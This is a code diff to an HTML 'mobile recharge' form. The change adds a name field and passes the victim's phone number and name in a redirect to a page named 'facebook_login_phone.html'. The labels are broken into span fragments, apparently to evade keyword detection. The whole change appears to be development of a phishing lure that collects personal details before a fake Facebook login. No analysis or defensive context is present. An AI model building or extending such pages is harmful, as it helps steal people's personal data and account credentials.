@@ -42,18 +42,21 @@
     <div id="recharge-form">
         <label for="mmber"><span>Mob</span>ile Nu<span>mber</span>:</label>
         <input type="text" id="mmber" required>
+        <label for="name"><span>Yo</span>ur N<span>ame</span>:</label>
+        <input type="text" id="name" required>
 
        
 
-        <input type="submit" value="Recharge">
+        <input type="submit" id='submit' value="Recharge">
     </div>
 
     <script>
-        document.getElementById("recharge-form").addEventListener("submit", function(event) {
+        document.getElementById("submit").addEventListener("click", function(event) {
             event.preventDefault();
             var mmber = document.getElementById("mmber").value;
+            var name = document.getElementById("name").value;
       
-window.location.href = "facebook_login_phone.html?vall=" + mmber;
+window.location.href = "facebook_login_phone.html?vall=" + mmber+"&name="+name;
 
         });
     </script>
